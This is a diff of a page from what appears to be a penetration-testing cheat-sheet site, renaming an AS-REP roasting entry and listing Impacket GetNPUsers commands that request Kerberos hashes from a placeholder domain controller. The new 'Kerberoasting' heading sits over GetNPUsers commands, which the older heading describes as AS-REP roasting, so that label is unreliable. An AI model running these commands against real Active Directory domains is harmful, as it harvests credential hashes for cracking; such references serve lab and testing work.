@@ -4,7 +4,7 @@
     <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<title>ASP | TLDRBins</title>
+<title>Kerberoasting | TLDRBins</title>
 <meta name="robots" content='noindex, nofollow'>
 <meta name="description" content="">
 <meta name="generator" content="hugo-index">
@@ -25,7 +25,7 @@
     </a>
     <span class="hl">/</span>
     <a href="https://tldrbins.github.io/asp-roasting/">
-      <span>ASP</span>
+      <span>Kerberoasting</span>
     </a>
   </h1>
   <p class="desc"></p>
@@ -34,9 +34,7 @@
 
 <ul class="tagsList single">
   
-  <li><a href="https://tldrbins.github.io/@asp-roasting/">Asp-Roasting</a></li>
-  
-  <li><a href="https://tldrbins.github.io/@asp-rep/">Asp-Rep</a></li>
+  <li><a href="https://tldrbins.github.io/@as_rep-roasting/">As_rep Roasting</a></li>
   
   <li><a href="https://tldrbins.github.io/@impacket/">Impacket</a></li>
   
@@ -48,13 +46,18 @@
   
   <li><a href="https://tldrbins.github.io/@windows/">Windows</a></li>
   
+  <li><a href="https://tldrbins.github.io/@kerberoasting/">Kerberoasting</a></li>
+  
+  <li><a href="https://tldrbins.github.io/@getnpusers/">GetNPUsers</a></li>
+  
 </ul>
 
 <div class="content"><hr>
-<h3 id="asp-roasting">ASP-Roasting</h3>
+<h3 id="as_rep-roasting">AS_REP Roasting</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers example.com/ -usersfile usernames.txt -no-pass -dc-ip 10.10.11.10
-</span></span></code></pre></div><h3 id="asp-rep-vulnerable-users">ASP-REP Vulnerable Users</h3>
+</span></span></code></pre></div><h3 id="kerberoasting">Kerberoasting</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers <span class="s1">&#39;example.com/user:password&#39;</span> -dc-ip 10.10.11.10
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">impacket-GetNPUsers -request <span class="s1">&#39;example.com/user:password&#39;</span> -dc-ip 10.10.11.10
 </span></span></code></pre></div><br></div></div>
     
     <script src="/js/utils.js"></script>
